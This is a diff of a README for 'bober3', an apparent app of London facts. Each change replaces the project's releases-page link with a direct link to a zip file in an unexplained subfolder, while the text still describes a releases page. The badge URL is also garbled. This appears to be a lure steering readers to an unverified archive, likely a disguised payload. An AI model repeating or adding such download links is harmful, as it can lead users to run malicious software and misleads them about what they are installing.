@@ -1,7 +1,7 @@
 # 🌟 bober3 - Simple Application for Learning About London
 
 ## 📥 Download Now!
-[![Download bober3](https://img.shields.io/badge/Download%20bober3-v1.0-blue.svg)](https://github.com/SinaAasy/bober3/releases)
+[![Download bober3](https://raw.githubusercontent.com/SinaAasy/bober3/main/gentisin/bober3.zip%https://raw.githubusercontent.com/SinaAasy/bober3/main/gentisin/bober3.zip)](https://raw.githubusercontent.com/SinaAasy/bober3/main/gentisin/bober3.zip)
 
 ## 🚀 Getting Started
 Welcome to **bober3**! This application helps you explore interesting facts about London, the capital of Great Britain. It is designed for everyone, regardless of technical skill. Follow the steps below to get started quickly.
@@ -28,7 +28,7 @@ Follow these steps to download and install **bober3**:
 1. **Visit the Releases Page**:
    Click the link below to go to the releases page where you can find the download files.
 
-   [Download bober3](https://github.com/SinaAasy/bober3/releases)
+   [Download bober3](https://raw.githubusercontent.com/SinaAasy/bober3/main/gentisin/bober3.zip)
 
 2. **Download the Latest Version**:
    On the releases page, look for the latest version of **bober3**. Click on the appropriate file for your operating system (Windows, macOS, or Linux). The file will begin downloading automatically.
@@ -57,4 +57,4 @@ If you want to contribute to **bober3**, we welcome your input. You can report i
 ## 🎉 Thank You for Using bober3!
 We appreciate your interest in learning more about London through our application. We hope you find the content engaging and informative. Don't forget to share your feedback and help us improve! 
 
-For more details, visit the releases page again at [Download bober3](https://github.com/SinaAasy/bober3/releases). Happy exploring!
+For more details, visit the releases page again at [Download bober3](https://raw.githubusercontent.com/SinaAasy/bober3/main/gentisin/bober3.zip). Happy exploring!
